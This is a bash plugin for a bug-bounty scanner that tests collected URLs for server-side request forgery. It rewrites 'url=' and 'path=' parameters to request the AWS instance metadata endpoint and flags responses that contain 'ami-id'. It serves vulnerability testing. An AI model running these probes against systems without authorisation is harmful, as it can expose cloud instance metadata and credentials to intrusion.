#!/bin/bash
# BBHunter SSRF Tester

PLUGIN_NAME="SSRF Tester"
PLUGIN_VERSION="1.3"
PLUGIN_AUTHOR="BBHunter Team by kdairatchi"
PLUGIN_DESCRIPTION="Tests for Server-Side Request Forgery vulnerabilities"
PLUGIN_CATEGORY="vulnerability"

run_ssrf_test() {
    local input_dir="$1"
    local output_dir="$2"
    mkdir -p "$output_dir/plugins/ssrf"
    
    local output_file="$output_dir/plugins/ssrf/results.txt"
    local vulnerable=0

    while read -r url; do
        # Check for URL parameters
        if [[ "$url" == *"url="* ]] || [[ "$url" == *"path="* ]]; then
            test_url="${url/url=/url=http://169.254.169.254/latest/meta-data/}"
            test_url="${test_url/path=/path=http://169.254.169.254/latest/meta-data/}"
            
            if curl -s "$test_url" | grep -q "ami-id"; then
                echo "SSRF Vulnerable: $url" >> "$output_file"
                ((vulnerable++))
            fi
        fi
    done < "$input_dir/recon/urls/all_urls.txt"

    return $vulnerable
}

register_plugin() {
    echo "{
        \"name\": \"$PLUGIN_NAME\",
        \"version\": \"$PLUGIN_VERSION\",
        \"author\": \"$PLUGIN_AUTHOR\",
        \"description\": \"$PLUGIN_DESCRIPTION\",
        \"category\": \"$PLUGIN_CATEGORY\",
        \"run_function\": \"run_ssrf_test\"
    }"
}

if [ "${BASH_SOURCE[0]}" != "$0" ]; then
    register_plugin
else
    run_ssrf_test "$1" "$2"
fi
